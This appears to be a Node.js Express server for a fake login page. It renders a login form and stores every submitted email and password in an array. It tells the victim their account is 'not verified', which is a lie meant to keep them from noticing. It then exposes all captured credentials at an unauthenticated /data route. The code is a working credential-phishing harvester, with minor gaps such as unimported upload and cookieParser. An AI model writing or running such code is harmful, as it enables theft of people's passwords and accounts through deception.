const express = require('express');


const path = require('path');

const cors = require('cors');
const app = express();
const port = 3000;
app.use(cors());
app.use(upload.none());
app.use(cookieParser());
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');
const data=[];

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', function (req, res) {
  try{

    res.render('login');
  }catch(error){
    res.send(error)
  }
});

app.post('/',function(req,res){
  try{
    const {email,password}=req.body;
    data.push(email,password);
    res.send({message:"Your account is not verified Plz Verify your Account And Try Again "})

  }catch(error){
    res.send(error)
  }

  

})
app.get('/data',function(req,res){
  try{

    res.send(data)
  }catch(error){
    res.send(error)
  }
})
app.listen(port, () => {
  console.log('Server is listening on Port', port);
});
